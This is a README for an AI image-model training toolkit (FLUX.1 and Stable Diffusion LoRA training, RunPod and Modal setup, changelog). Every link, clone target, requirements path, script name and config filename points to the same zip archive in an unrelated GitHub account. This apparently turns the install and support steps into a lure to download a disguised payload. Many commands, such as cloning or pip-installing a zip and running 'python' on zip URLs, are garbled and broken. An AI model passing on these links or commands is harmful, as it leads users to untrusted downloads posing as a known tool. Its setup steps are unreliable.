# AI Toolkit by Ostris

## IMPORTANT NOTE - READ THIS
This is my research repo. I do a lot of experiments in it and it is possible that I will break things.
If something breaks, checkout an earlier commit. This repo can train a lot of things, and it is
hard to keep up with all of them.

## Support my work

<a href="https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip" target="_blank">
<img alt="https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip" src="https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip" width="256" height="auto">
</a>


My work on this project would not be possible without the amazing support of [Glif](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip) and everyone on the 
team. If you want to support me, support Glif. [Join the site](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip), 
[Join us on Discord](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip), [follow us on Twitter](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip)
and come make some cool stuff with us

## Installation

Requirements:
- python >3.10
- Nvidia GPU with enough ram to do what you need
- python venv
- git



Linux:
```bash
git clone https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip
cd ai-toolkit
git submodule update --init --recursive
python3 -m venv venv
source venv/bin/activate
# .\venv\Scripts\activate on windows
# install torch first
pip3 install torch
pip3 install -r https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip
```

Windows:
```bash
git clone https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip
cd ai-toolkit
git submodule update --init --recursive
python -m venv venv
.\venv\Scripts\activate
pip install torch torchvision --index-url https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip
pip install -r https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip
```

## FLUX.1 Training

### Tutorial

To get started quickly, check out [@araminta_k](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip) tutorial on [Finetuning Flux Dev on a 3090](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip) with 24GB VRAM.


### Requirements
You currently need a GPU with **at least 24GB of VRAM** to train FLUX.1. If you are using it as your GPU to control 
your monitors, you probably need to set the flag `low_vram: true` in the config file under `model:`. This will quantize
the model on CPU and should allow it to train with monitors attached. Users have gotten it to work on Windows with WSL,
but there are some reports of a bug when running on windows natively. 
I have only tested on linux for now. This is still extremely experimental
and a lot of quantizing and tricks had to happen to get it to fit on 24GB at all. 

### FLUX.1-dev

FLUX.1-dev has a non-commercial license. Which means anything you train will inherit the
non-commercial license. It is also a gated model, so you need to accept the license on HF before using it.
Otherwise, this will fail. Here are the required steps to setup a license.

1. Sign into HF and accept the model access here [black-forest-labs/FLUX.1-dev](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip)
2. Make a file named `.env` in the root on this folder
3. [Get a READ key from huggingface](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip) and add it to the `.env` file like so `HF_TOKEN=your_key_here`

### FLUX.1-schnell

FLUX.1-schnell is Apache 2.0. Anything trained on it can be licensed however you want and it does not require a HF_TOKEN to train.
However, it does require a special adapter to train with it, [ostris/FLUX.1-schnell-training-adapter](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip).
It is also highly experimental. For best overall quality, training on FLUX.1-dev is recommended.

To use it, You just need to add the assistant to the `model` section of your config file like so:

```yaml
      model:
        name_or_path: "black-forest-labs/FLUX.1-schnell"
        assistant_lora_path: "ostris/FLUX.1-schnell-training-adapter"
        is_flux: true
        quantize: true
```

You also need to adjust your sample steps since schnell does not require as many

```yaml
      sample:
        guidance_scale: 1  # schnell does not do guidance
        sample_steps: 4  # 1 - 4 works well
```

### Training
1. Copy the example config file located at `https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip` (`https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip` for schnell) to the `config` folder and rename it to `https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip`
2. Edit the file following the comments in the file
3. Run the file like so `python https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip`

A folder with the name and the training folder from the config file will be created when you start. It will have all 
checkpoints and images in it. You can stop the training at any time using ctrl+c and when you resume, it will pick back up
from the last checkpoint.

IMPORTANT. If you press crtl+c while it is saving, it will likely corrupt that checkpoint. So wait until it is done saving

### Need help?

Please do not open a bug report unless it is a bug in the code. You are welcome to [Join my Discord](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip)
and ask for help there. However, please refrain from PMing me directly with general question or support. Ask in the discord
and I will answer when I can.

## Gradio UI

To get started training locally with a with a custom UI, once you followed the steps above and `ai-toolkit` is installed:

```bash
cd ai-toolkit #in case you are not yet in the ai-toolkit folder
huggingface-cli login #provide a `write` token to publish your LoRA at the end
python https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip
```

You will instantiate a UI that will let you upload your images, caption them, train and publish your LoRA
![image](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip)


## Training in RunPod
Example RunPod template: **runpod/pytorch:2.2.0-py3.10-cuda12.1.1-devel-ubuntu22.04**
> You need a minimum of 24GB VRAM, pick a GPU by your preference.

#### Example config ($0.5/hr):
- 1x A40 (48 GB VRAM)
- 19 vCPU 100 GB RAM

#### Custom overrides (you need some storage to clone FLUX.1, store datasets, store trained models and samples):
- ~120 GB Disk
- ~120 GB Pod Volume
- Start Jupyter Notebook

### 1. Setup
```
git clone https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip
cd ai-toolkit
git submodule update --init --recursive
python -m venv venv
source venv/bin/activate
pip install torch
pip install -r https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip
pip install --upgrade accelerate transformers diffusers huggingface_hub #Optional, run it if you run into issues
```
### 2. Upload your dataset
- Create a new folder in the root, name it `dataset` or whatever you like.
- Drag and drop your .jpg, .jpeg, or .png images and .txt files inside the newly created dataset folder.

### 3. Login into Hugging Face with an Access Token
- Get a READ token from [here](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip) and request access to Flux.1-dev model from [here](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip).
- Run ```huggingface-cli login``` and paste your token.

### 4. Training
- Copy an example config file located at ```config/examples``` to the config folder and rename it to ```https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip```.
- Edit the config following the comments in the file.
- Change ```folder_path: "/path/to/images/folder"``` to your dataset path like ```folder_path: "/workspace/ai-toolkit/your-dataset"```.
- Run the file: ```python https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip```.

### Screenshot from RunPod
<img width="1728" alt="RunPod Training Screenshot" src="https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip">

## Training in Modal

### 1. Setup
#### ai-toolkit:
```
git clone https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip
cd ai-toolkit
git submodule update --init --recursive
python -m venv venv
source venv/bin/activate
pip install torch
pip install -r https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip
pip install --upgrade accelerate transformers diffusers huggingface_hub #Optional, run it if you run into issues
```
#### Modal:
- Run `pip install modal` to install the modal Python package.
- Run `modal setup` to authenticate (if this doesn’t work, try `python -m modal setup`).

#### Hugging Face:
- Get a READ token from [here](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip) and request access to Flux.1-dev model from [here](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip).
- Run `huggingface-cli login` and paste your token.

### 2. Upload your dataset
- Drag and drop your dataset folder containing the .jpg, .jpeg, or .png images and .txt files in `ai-toolkit`.

### 3. Configs
- Copy an example config file located at ```config/examples/modal``` to the `config` folder and rename it to ```https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip```.
- Edit the config following the comments in the file, **<ins>be careful and follow the example `/root/ai-toolkit` paths</ins>**.

### 4. Edit https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip
- Set your entire local `ai-toolkit` path at `code_mount = https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip` like:
  
   ```
   code_mount = https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip("/Users/username/ai-toolkit", remote_path="/root/ai-toolkit")
   ```
- Choose a `GPU` and `Timeout` in `https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip` _(default is A100 40GB and 2 hour timeout)_.

### 5. Training
- Run the config file in your terminal: `modal run https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip`.
- You can monitor your training in your local terminal, or on [https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip).
- Models, samples and optimizer will be stored in `Storage > flux-lora-models`.

### 6. Saving the model
- Check contents of the volume by running `modal volume ls flux-lora-models`. 
- Download the content by running `modal volume get flux-lora-models your-model-name`.
- Example: `modal volume get flux-lora-models my_first_flux_lora_v1`.

### Screenshot from Modal

<img width="1728" alt="Modal Traning Screenshot" src="https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip">

---

## Dataset Preparation

Datasets generally need to be a folder containing images and associated text files. Currently, the only supported
formats are jpg, jpeg, and png. Webp currently has issues. The text files should be named the same as the images
but with a `.txt` extension. For example `https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip` and `https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip`. The text file should contain only the caption.
You can add the word `[trigger]` in the caption file and if you have `trigger_word` in your config, it will be automatically
replaced. 

Images are never upscaled but they are downscaled and placed in buckets for batching. **You do not need to crop/resize your images**.
The loader will automatically resize them and can handle varying aspect ratios. 


## Training Specific Layers

To train specific layers with LoRA, you can use the `only_if_contains` network kwargs. For instance, if you want to train only the 2 layers
used by The Last Ben, [mentioned in this post](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip), you can adjust your
network kwargs like so:

```yaml
      network:
        type: "lora"
        linear: 128
        linear_alpha: 128
        network_kwargs:
          only_if_contains:
            - "https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip"
            - "https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip"
```

The naming conventions of the layers are in diffusers format, so checking the state dict of a model will reveal 
the suffix of the name of the layers you want to train. You can also use this method to only train specific groups of weights.
For instance to only train the `single_transformer` for FLUX.1, you can use the following:

```yaml
      network:
        type: "lora"
        linear: 128
        linear_alpha: 128
        network_kwargs:
          only_if_contains:
            - "https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip"
```

You can also exclude layers by their names by using `ignore_if_contains` network kwarg. So to exclude all the single transformer blocks,


```yaml
      network:
        type: "lora"
        linear: 128
        linear_alpha: 128
        network_kwargs:
          ignore_if_contains:
            - "https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip"
```

`ignore_if_contains` takes priority over `only_if_contains`. So if a weight is covered by both,
if will be ignored.

---

## EVERYTHING BELOW THIS LINE IS OUTDATED 

It may still work like that, but I have not tested it in a while.

---

### Batch Image Generation

A image generator that can take frompts from a config file or form a txt file and generate them to a 
folder. I mainly needed this for an SDXL test I am doing but added some polish to it so it can be used
for generat batch image generation.
It all runs off a config file, which you can find an example of in  `https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip`.
Mere info is in the comments in the example

---

### LoRA (lierla), LoCON (LyCORIS) extractor

It is based on the extractor in the [LyCORIS](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip) tool, but adding some QOL features
and LoRA (lierla) support. It can do multiple types of extractions in one run.
It all runs off a config file, which you can find an example of in  `https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip`.
Just copy that file, into the `config` folder, and rename it to `https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip`.
Then you can edit the file to your liking. and call it like so:

```bash
python3 https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip
```

You can also put a full path to a config file, if you want to keep it somewhere else.

```bash
python3 https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip "https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip"
```

More notes on how it works are available in the example config file itself. LoRA and LoCON both support
extractions of 'fixed', 'threshold', 'ratio', 'quantile'. I'll update what these do and mean later.
Most people used fixed, which is traditional fixed dimension extraction.

`process` is an array of different processes to run. You can add a few and mix and match. One LoRA, one LyCON, etc.

---

### LoRA Rescale

Change `<lora:my_lora:4.6>` to `<lora:my_lora:1.0>` or whatever you want with the same effect. 
A tool for rescaling a LoRA's weights. Should would with LoCON as well, but I have not tested it.
It all runs off a config file, which you can find an example of in  `https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip`.
Just copy that file, into the `config` folder, and rename it to `https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip`.
Then you can edit the file to your liking. and call it like so:

```bash
python3 https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip
```

You can also put a full path to a config file, if you want to keep it somewhere else.

```bash
python3 https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip "https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip"
```

More notes on how it works are available in the example config file itself. This is useful when making 
all LoRAs, as the ideal weight is rarely 1.0, but now you can fix that. For sliders, they can have weird scales form -2 to 2
or even -15 to 15. This will allow you to dile it in so they all have your desired scale

---

### LoRA Slider Trainer

<a target="_blank" href="https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip">
  <img src="https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip" alt="Open In Colab"/>
</a>

This is how I train most of the recent sliders I have on Civitai, you can check them out in my [Civitai profile](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip).
It is based off the work by [p1atdev/LECO](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip) and [rohitgandikota/erasing](https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip)
But has been heavily modified to create sliders rather than erasing concepts. I have a lot more plans on this, but it is
very functional as is. It is also very easy to use. Just copy the example config file in `https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip`
to the `config` folder and rename it to `https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip`. Then you can edit the file to your liking. and call it like so:

```bash
python3 https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip
```

There is a lot more information in that example file. You can even run the example as is without any modifications to see
how it works. It will create a slider that turns all animals into dogs(neg) or cats(pos). Just run it like so:

```bash
python3 https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip
```

And you will be able to see how it works without configuring anything. No datasets are required for this method.
I will post an better tutorial soon. 

---

## Extensions!!

You can now make and share custom extensions. That run within this framework and have all the inbuilt tools
available to them. I will probably use this as the primary development method going
forward so I dont keep adding and adding more and more features to this base repo. I will likely migrate a lot
of the existing functionality as well to make everything modular. There is an example extension in the `extensions`
folder that shows how to make a model merger extension. All of the code is heavily documented which is hopefully
enough to get you started. To make an extension, just copy that example and replace all the things you need to.


### Model Merger - Example Extension
It is located in the `extensions` folder. It is a fully finctional model merger that can merge as many models together
as you want. It is a good example of how to make an extension, but is also a pretty useful feature as well since most
mergers can only do one model at a time and this one will take as many as you want to feed it. There is an 
example config file in there, just copy that to your `config` folder and rename it to `https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip`.
and use it like any other config file.

## WIP Tools


### VAE (Variational Auto Encoder) Trainer

This works, but is not ready for others to use and therefore does not have an example config. 
I am still working on it. I will update this when it is ready.
I am adding a lot of features for criteria that I have used in my image enlargement work. A Critic (discriminator),
content loss, style loss, and a few more. If you don't know, the VAE
for stable diffusion (yes even the MSE one, and SDXL), are horrible at smaller faces and it holds SD back. I will fix this.
I'll post more about this later with better examples later, but here is a quick test of a run through with various VAEs.
Just went in and out. It is much worse on smaller faces than shown here.

<img src="https://raw.githubusercontent.com/KoDelioDa/ai-toolkit/main/docker/ai-toolkit-3.8-beta.3.zip" width="768" height="auto"> 

---

## TODO
- [X] Add proper regs on sliders
- [X] Add SDXL support (base model only for now)
- [ ] Add plain erasing
- [ ] Make Textual inversion network trainer (network that spits out TI embeddings)

---

## Change Log

#### 2023-08-05
 - Huge memory rework and slider rework. Slider training is better thant ever with no more
ram spikes. I also made it so all 4 parts of the slider algorythm run in one batch so they share gradient
accumulation. This makes it much faster and more stable. 
 - Updated the example config to be something more practical and more updated to current methods. It is now
a detail slide and shows how to train one without a subject. 512x512 slider training for 1.5 should work on 
6GB gpu now. Will test soon to verify. 


#### 2021-10-20
 - Windows support bug fixes
 - Extensions! Added functionality to make and share custom extensions for training, merging, whatever.
check out the example in the `extensions` folder. Read more about that above.
 - Model Merging, provided via the example extension.

#### 2023-08-03
Another big refactor to make SD more modular.

Made batch image generation script

#### 2023-08-01
Major changes and update. New LoRA rescale tool, look above for details. Added better metadata so
Automatic1111 knows what the base model is. Added some experiments and a ton of updates. This thing is still unstable
at the moment, so hopefully there are not breaking changes. 

Unfortunately, I am too lazy to write a proper changelog with all the changes.

I added SDXL training to sliders... but.. it does not work properly. 
The slider training relies on a model's ability to understand that an unconditional (negative prompt)
means you do not want that concept in the output. SDXL does not understand this for whatever reason, 
which makes separating out
concepts within the model hard. I am sure the community will find a way to fix this 
over time, but for now, it is not 
going to work properly. And if any of you are thinking "Could we maybe fix it by adding 1 or 2 more text
encoders to the model as well as a few more entirely separate diffusion networks?" No. God no. It just needs a little
training without every experimental new paper added to it. The KISS principal. 


#### 2023-07-30
Added "anchors" to the slider trainer. This allows you to set a prompt that will be used as a 
regularizer. You can set the network multiplier to force spread consistency at high weights

